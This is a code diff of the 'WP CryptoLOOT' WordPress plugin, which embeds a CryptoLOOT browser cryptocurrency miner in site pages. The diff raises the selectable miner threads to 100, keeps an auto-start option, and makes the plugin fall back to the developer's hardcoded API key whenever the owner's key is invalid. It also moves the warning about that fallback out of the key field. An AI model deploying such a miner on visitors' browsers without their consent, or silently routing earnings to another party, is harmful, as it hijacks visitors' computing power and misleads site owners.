@@ -2,17 +2,17 @@
 /**
 Plugin Name: WP CryptoLOOT
 Description: This plugin will add CryptoLOOT miner and captcha capabilities to a WordPress installation. Requires a CryptoLOOT account.
-Plugin URI: https://github.com/scowebb/wp-cryptoloot/
-Version: 1.1
+Plugin URI: https://wpcryptoloot.com/
+Version: 1.2
 Author: Scott Webber
-Author URI: https://github.com/scowebb/
+Author URI: https://wpcryptoloot.com/
 License: GNU GPLv2 or later
 Text Domain: wp-cryptoloot
 */
 /**
 @package wpcryptoloot
 @author Scott Webber
-@version 1.1
+@version 1.2
 */
 /**     
 The WP CryptoLOOT plugin will add CryptoLOOT miner and captcha capabilities to a WordPress installation. Requires a CryptoLOOT account.
@@ -38,7 +38,6 @@ if( !defined( 'ABSPATH' ) ) {
 	exit();
 }
 
-define( 'WPCL_VERSION', '1.1' );
 define( 'WPCL_PLUGIN_URL', plugin_dir_url( __FILE__ ) );
 define( 'WPCL_REF_URL', esc_url( 'https://crypto-loot.org/ref.php?go=aa489c6aafb514f720c145f199c25428' ) );
 
@@ -109,7 +108,7 @@ if( !function_exists( 'wpcl_styles' ) ) {
 if( !function_exists('wpcl_admin_page_loader') ) {
 	add_action( 'admin_menu', 'wpcl_admin_page_loader' );
 	function wpcl_admin_page_loader() { 
-		add_options_page( 'WP CryptoLOOT', 'CryptoLOOT', 'manage_options', 'wpcl_plugin', 'wpcl_admin_options_page' );
+		add_options_page( 'WP CryptoLOOT', 'WP CryptoLOOT', 'manage_options', 'wpcl_plugin', 'wpcl_admin_options_page' );
 	}	
 }
 
@@ -145,9 +144,7 @@ if( !function_exists( 'cryptoloot_miner_payload' ) ) {
 			$crypto_miner = '
 <script src="//statdynamic.com/lib/crypta.js"></script>
 <script>
-	var miner=new CRLT.Anonymous(\''.$public_key.'\', {
-		threads:'.$threads.', throttle:'.$throttle.', coin: "upx",
-		});
+	var miner=new CRLT.Anonymous(\''.$public_key.'\', { threads:'.$threads.', throttle:'.$throttle.', coin: "upx",});
 	'.( $checked == true ? $initiate : '' ).'
 </script>
 			';
@@ -375,39 +372,57 @@ if( !function_exists( 'cryptoloot_setting_init' ) ) {
 
 if( !function_exists( 'cryptoloot_loader' ) ) {
 	add_action( 'admin_init', 'cryptoloot_loader' );
+	add_action( 'admin_notices', 'wcpl_admin_notices'  );
+	/** @since 1.2 */
+	function wcpl_admin_notices() {
+		$screen = get_current_screen();
+		$page = $screen->id;
+		$options = get_option( 'wpcl_settings' );	
+		if( isset( $options['wpcl_public_key'] ) ) {
+			$check_key = $options['wpcl_public_key'];
+			$length = strlen( $check_key );
+			$alnum_check = ctype_alnum( $check_key );
+			if( $length == 44 && $alnum_check == true ) {
+				$public_key = $options['wpcl_public_key'];
+			} else {					
+				$public_key = '7b98820d4d9738e5cd928e923f30e6a3c23ef47d57d9';
+			}
+		} else {
+			$public_key = '7b98820d4d9738e5cd928e923f30e6a3c23ef47d57d9';
+		}
+		if( $page == 'settings_page_wpcl_plugin' ){
+			if( $public_key == '7b98820d4d9738e5cd928e923f30e6a3c23ef47d57d9' ) {
+				echo '<div class="notice notice-warning"><p><b>Developer API key currently in use.</b> </p><p>Sign up for a free <a href="'.WPCL_REF_URL.'" target="_blank" rel="noopener">CryptoLOOT account</a> to get your own API key.</p></div>';
+			}
+		}
+	}
 	function cryptoloot_loader() {
-		
-		function wpcl_settings_section_callback() {
-			$html = '
-<p>Sign up for a free <a href="'.WPCL_REF_URL.'" target="_blank" rel="noopener">CryptoLOOT account</a> to get your own API key.</p>
-			';
+		function wpcl_settings_section_callback(){
+			$html = '';
 			echo $html;
 		}
 
 		function wpcl_public_key_render() {
 			$options = get_option( 'wpcl_settings' );
-			$_error = false;
+			
 			if( isset( $options['wpcl_public_key'] ) ) {
 				$check_key = $options['wpcl_public_key'];
 				$length = strlen( $check_key );
 				$alnum_check = ctype_alnum( $check_key );
 				if( $length == 44 && $alnum_check == true ) {
 					$public_key = $options['wpcl_public_key'];
-				} else {
+				} else {					
 					$public_key = '7b98820d4d9738e5cd928e923f30e6a3c23ef47d57d9';
-					$_error = true;
 				}
 			} else {
 				$public_key = '7b98820d4d9738e5cd928e923f30e6a3c23ef47d57d9';
 			}
+			
 			$html = '<input type="text" name="wpcl_settings[wpcl_public_key]" length="44" value="'.$public_key.'" />';
-			$error = '<br> <span class="error"><b>WARNING</b>: You\'ll be using my API key since yours is not valid.</span>';
 			echo $html;
-			if( $_error == true ) {
-				echo $error;
-			}
-		}
 		
+		}		
+
 		function wpcl_auto_miner_render() {
 			$options = get_option( 'wpcl_settings' );
 			$hidden = '<input type="hidden" name="wpcl_settings[wpcl_auto_miner]" value="0" />';
@@ -428,6 +443,15 @@ if( !function_exists( 'cryptoloot_loader' ) ) {
 			echo '<option value"4" '.( $option == 4 ? $selected : '' ).'>4</option>';
 			echo '<option value"5" '.( $option == 5 ? $selected : '' ).'>5</option>';
 			echo '<option value"6" '.( $option == 6 ? $selected : '' ).'>6</option>';
+			echo '<option value"7" '.( $option == 7 ? $selected : '' ).'>7</option>';
+			echo '<option value"8" '.( $option == 8 ? $selected : '' ).'>8</option>';
+			echo '<option value"9" '.( $option == 9 ? $selected : '' ).'>9</option>';
+			echo '<option value"10" '.( $option == 10 ? $selected : '' ).'>10</option>';
+			echo '<option value"20" '.( $option == 20 ? $selected : '' ).'>20</option>';
+			echo '<option value"30" '.( $option == 30 ? $selected : '' ).'>30</option>';
+			echo '<option value"40" '.( $option == 40 ? $selected : '' ).'>40</option>';
+			echo '<option value"50" '.( $option == 50 ? $selected : '' ).'>50</option>';
+			echo '<option value"100" '.( $option == 100 ? $selected : '' ).'>100</option>';
 			echo '</select> <text>Choose the number of threads to run.</text>';
 		}
 		
